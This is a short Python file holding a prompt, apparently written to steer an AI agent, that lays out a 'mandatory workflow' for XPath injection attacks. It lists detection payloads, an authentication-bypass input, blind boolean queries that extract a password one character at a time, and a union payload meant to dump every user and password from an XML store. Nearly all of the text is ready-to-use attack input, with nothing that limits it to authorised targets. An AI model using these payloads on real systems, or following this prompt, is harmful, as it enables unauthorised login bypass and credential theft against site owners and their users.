"""
XPath Injection Attack Skill Prompt.
"""

XPATH_INJECTION_SKILL_PROMPT = """
## ATTACK SKILL: XPATH INJECTION

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
XPath injection targets XML databases queried with XPath. Test with:
```
' or '1'='1
' or true()
'] | //user[name='*'] | //password['
' and '1'='2
```

#### STEP 2: AUTH BYPASS
```
username: ' or '1'='1
password: ' or '1'='1
-> XPath: //user[username='' or '1'='1'][password='' or '1'='1']
```

#### STEP 3: BLIND XPATH EXTRACTION
```
' or string-length(//user[1]/password)=8 and '1'='1
' or substring(//user[1]/password,1,1)='a' and '1'='1
```
-> Boolean-based character-by-character extraction.

#### STEP 4: XPATH UNION
```
'] | //user[name!='*'] | //password['
```
-> Returns all users and passwords in the XML document.

#### ANTI-PATTERNS: XPath injection is rare but high-impact when found. Look for XML-based search/filtering endpoints.
"""
